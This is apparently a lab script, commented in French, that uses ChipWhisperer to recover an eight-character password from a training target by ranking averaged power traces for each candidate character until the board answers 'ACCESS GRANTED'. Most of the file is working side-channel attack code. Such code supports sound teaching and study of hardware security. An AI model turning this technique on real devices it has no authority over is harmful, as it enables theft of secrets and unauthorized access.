"""Recherche sequentielle du mot de passe par analyse des traces de puissance."""

import random

import matplotlib.pyplot as plt
import numpy as np
import chipwhisperer as cw

import password_first as first_char


# La cible compare exactement huit caracteres (voir early_exit_compare(..., 8)).
PASSWORD_LENGTH = 8
KNOWN_PREFIX = "f"
CHARACTER_CODES = range(33, 127)
# Plus de repetitions par candidat pour reduire l'effet du bruit de mesure.
N_REPEAT = 30
PLOT_DIR = first_char.PLOT_DIR / "password_full_plots"


def capture_guess(scope, target, guess: str):
    """Capture la puissance pour une tentative et renvoie aussi la reponse serie."""
    scope.arm()
    target.ser.write((guess + "\n").encode("latin-1"))
    timed_out = scope.capture()

    # La reponse commence par ACCESS GRANTED en cas de mot de passe complet correct.
    response = target.ser.read(100, timeout=120)
    if isinstance(response, bytes):
        response = response.decode("latin-1", errors="replace")
    else:
        response = str(response or "")

    if timed_out:
        return None, response
    return scope.get_last_trace(), response


def collect_position_traces(scope, target, prefix: str):
    """Capture les essais prefixe+caractere, en reprenant l'analyse du premier caractere."""
    # Comme dans le script single, vide les reponses serie avant chaque campagne.
    first_char.resync(target)
    captures_by_character = {
        chr(codepoint): [] for codepoint in CHARACTER_CODES
    }
    granted_character = None

    # Une passe capture une fois chaque candidat; l'ordre est remelange a chaque passe.
    candidates = list(captures_by_character)
    for _ in range(N_REPEAT):
        shuffled_candidates = candidates.copy()
        random.shuffle(shuffled_candidates)
        for character in shuffled_candidates:
            trace, response = capture_guess(scope, target, prefix + character)
            if trace is not None:
                captures_by_character[character].append(trace)
            if "ACCESS GRANTED" in response:
                granted_character = character
                break

        if granted_character is not None:
            # La cible peut rester occupee a executer la section protegee.
            break

    traces = {
        character: np.mean(captures, axis=0)
        for character, captures in captures_by_character.items()
        if captures
    }
    if not traces:
        raise RuntimeError(
            "Aucune trace valide n'a ete capturee "
            f"a la position {len(prefix) + 1}."
        )
    if len(traces) < 2 and granted_character is None:
        raise RuntimeError(
            "Pas assez de traces valides pour classer les candidats "
            f"a la position {len(prefix) + 1}."
        )

    return traces, granted_character


def save_position_plots(
    position: int,
    traces: dict[str, np.ndarray],
    characters: list[str],
    matrix: np.ndarray,
    spread: np.ndarray,
    window_end: int,
    scores: np.ndarray,
    best: str,
    confirmed: str | None,
) -> None:
    """Enregistre dispersion, traces et classement pour une position testee."""
    PLOT_DIR.mkdir(parents=True, exist_ok=True)
    stem = f"position_{position:02d}"

    # Dispersion des traces dans la fenetre qui suit le trigger.
    plt.figure(figsize=(12, 3))
    plt.plot(spread)
    plt.axvline(0, color="red", linestyle="--", label="Front du trigger (t=0)")
    plt.title(f"Position {position} - dispersion apres le trigger")
    plt.xlabel("Echantillon apres le trigger")
    plt.ylabel("Ecart absolu de puissance")
    plt.legend()
    plt.tight_layout()
    plt.savefig(PLOT_DIR / f"{stem}_dispersion.png", dpi=140)
    plt.close()

    # Superposition des traces de tous les candidats de cette position.
    plt.figure(figsize=(12, 4))
    for character in characters:
        plt.plot(
            range(window_end),
            traces[character][:window_end],
            color="lightgray",
            linewidth=0.5,
        )
    if best in traces:
        plt.plot(
            range(window_end),
            traces[best][:window_end],
            color="blue",
            linewidth=1.5,
            label=f"Classement: {best!r}",
        )
    if confirmed is not None and confirmed in traces:
        plt.plot(
            range(window_end),
            traces[confirmed][:window_end],
            color="green",
            linewidth=1.5,
            label=f"Confirme: {confirmed!r}",
        )
    plt.axvline(0, color="black", linestyle=":", label="Front du trigger")
    plt.title(f"Position {position} - puissance par candidat")
    plt.xlabel("Echantillon apres le trigger")
    plt.ylabel("Puissance mesuree")
    plt.legend()
    plt.tight_layout()
    plt.savefig(PLOT_DIR / f"{stem}_traces.png", dpi=140)
    plt.close()

    # Scores issus de la meme fonction d'analyse que celle du premier caractere.
    colors = [
        "green" if character == confirmed else
        "blue" if character == best else
        "steelblue"
        for character in characters
    ]
    plt.figure(figsize=(14, 3))
    plt.bar(range(len(characters)), scores, color=colors)
    plt.xticks(range(len(characters)), characters, fontsize=7)
    plt.title(f"Position {position} - ecart moyen dans la fenetre trigger")
    plt.xlabel("Caractere candidat")
    plt.ylabel("Ecart absolu moyen")
    plt.tight_layout()
    plt.savefig(PLOT_DIR / f"{stem}_scores.png", dpi=140)
    plt.close()


def main() -> None:
    scope = None
    target = None
    try:
        scope = cw.scope()
        scope.default_setup()
        target = cw.target(scope, cw.targets.SimpleSerial2)
        target.baud = 9600

        first_char.resync(target)
        print("ChipWhisperer connecte.")
        # Meme capture de controle que dans le script single avant la campagne.
        test_trace = first_char.capture_guess(scope, target, "f")
        print(
            "Capture test :",
            None if test_trace is None else f"OK, {len(test_trace)} echantillons",
        )
        print(
            f"Recherche de {PASSWORD_LENGTH} caracteres; "
            f"{N_REPEAT} captures par candidat."
        )

        prefix = KNOWN_PREFIX
        print(f"Prefixe de depart suppose correct : {prefix!r}")
        for position in range(len(prefix) + 1, PASSWORD_LENGTH + 1):
            # Chaque candidat prolonge le prefixe retenu a l'etape precedente.
            traces, granted_character = collect_position_traces(
                scope, target, prefix
            )
            (
                characters,
                matrix,
                spread,
                window_end,
                scores,
                order,
                best,
            ) = first_char.analyze_traces(traces)

            # La reponse du firmware confirme directement le dernier caractere.
            chosen = granted_character or best
            save_position_plots(
                position,
                traces,
                characters,
                matrix,
                spread,
                window_end,
                scores,
                best,
                granted_character,
            )

            if chosen in characters:
                rank_text = (
                    f"{list(order).index(characters.index(chosen)) + 1}"
                    f"/{len(characters)}"
                )
            else:
                rank_text = "indisponible (capture en timeout)"
            prefix += chosen
            print(
                f"Position {position}/{PASSWORD_LENGTH}: {chosen!r} "
                f"(rang du score: {rank_text})"
            )
            if granted_character is not None:
                print("La cible a repondu ACCESS GRANTED.")
                print("Mot de passe retrouve :", prefix)
                print("Graphiques enregistres dans :", PLOT_DIR.resolve())
                return

        raise RuntimeError(
            "Le classement a propose un prefixe complet, mais la cible n'a pas "
            "repondu ACCESS GRANTED. Consulte les graphiques avant de conclure."
        )
    finally:
        if target is not None:
            target.dis()
        if scope is not None:
            scope.dis()
        print("Connexions fermees.")


if __name__ == "__main__":
    main()